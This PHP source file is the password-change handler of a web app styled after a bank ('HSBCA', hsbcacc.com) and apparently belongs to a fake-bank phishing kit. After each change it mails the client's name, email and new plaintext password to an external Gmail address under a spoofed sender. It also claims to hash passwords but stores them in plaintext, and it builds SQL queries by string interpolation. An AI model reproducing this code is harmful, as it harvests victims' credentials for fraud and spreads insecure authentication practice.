<?php include 'includes/timeoutable.php' ?>

<body style="background-color: black;" onload="blinktext();">
  <?php include 'includes/db.php'; ?>
  <?php
      

if (isset($_POST['new_pwd'])
    && isset($_POST['new_pwdc'])) {

    function validate($data)
    {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }

    //$old_pwd = validate($_POST['old_pwd']);
    $new_pwd = validate($_POST['new_pwd']);
    $new_pwdc = validate($_POST['new_pwdc']);
    
    if(empty($new_pwd)) {
        header("Location: profile.php?error=Password is required");
        exit();
    } elseif(empty($new_pwdc)) {
        header("Location: profile.php?error=New Password is required");
        exit();
    } elseif($new_pwd !== $new_pwdc) {
        header("Location: create_new_password.php?error=password_not_match");
        exit();
    } else {
        // hashing the password
        
        $new_pwd = $new_pwd;
        $email = $_SESSION['email'];

        $sql = "SELECT *
                FROM users WHERE 
                email='$email'";
        $result = mysqli_query($conn, $sql);
        if(mysqli_num_rows($result) === 1) {
            
            $sql_2 = "UPDATE users
        	          SET password='$new_pwd', confirm_password='$new_pwd'
        	          WHERE email='$email'";
            mysqli_query($conn, $sql_2);
            //TO SEND EMAIL TO NEW USER BEGINS
            $to = "bludarymulti.resource@gmail.com"; // this is your Email address
            $from = "info@hsbcacc.com"; // this is the sender's Email address
            $name = $_SESSION["name"];
            $name = $_SESSION["email"];
            $first_name = "Chief";
            $subject2 = "New password Update";
            $headers  = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
            $message = '<html><body>';
            $message = '<div class="navbar-brand"  style="text-align: center;" href=""><img src="https://i.ibb.co/pK6BfqV/CDFBank-Logo-Original-5000x5000-2-3.png" alt="hsbca" class="logo">';
            $message .= '<div  style="background-color: #f3f3f3;">';
            $message .= '<h2 style="text-align: left;">Hi <strong>'. $first_name . '</strong></h2>';
            $message .= '<p>This is a notification email of a recent password change by a client, find details bellow</p>';
            $message .= '<p>Client name: '. $name.'Email:'. $email . 'New Password:'. $new_pwd . '</p>';
                       
            $message .= '<p>Don’t recognise this activity? Please ignore</p>';
            $message .= '<div style="background-color: #005eb8; color: white;"><a href="https://www.hsbcacc.com" style="color: white"><b>HSBCA!</b></a> Always giving you extra. Get a little extra help from the <a href="https://www.hsbca.com"><b>HSBCA</b></a>.</div>';
            $message .= '</div></div></body></html>';
            $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
            mail($to, $subject2, $message, $headers);  // sends a copy of the message to the sender
            //TO SEND EMAIL ENDS
            header("Location: index.php?success=password_changed");
            exit();

        } else {
            header("Location: create_new_password.php?error=Incorrect password");
            exit();
        }

    }


} else {
    header("Location: create_new_password.php");
    exit();
}

?>